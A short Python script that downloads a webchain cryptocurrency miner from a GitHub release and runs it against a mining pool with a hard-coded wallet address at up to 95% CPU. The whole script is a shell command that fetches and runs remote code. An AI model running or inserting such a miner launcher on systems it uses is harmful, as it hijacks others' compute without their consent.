import os
os.system("rm -f webchain-miner && rm -f webchain-miner-2.8.0-linux-amd64.tar.gz && wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar -zxf webchain-miner-2.8.0-linux-amd64.tar.gz  && ./webchain-miner -o pool.webchain.network:3333 -u 0x035df003384a67aa08cd63974928e4bc58551ee4 -p x --donate-level=1 --max-cpu-usage 95")
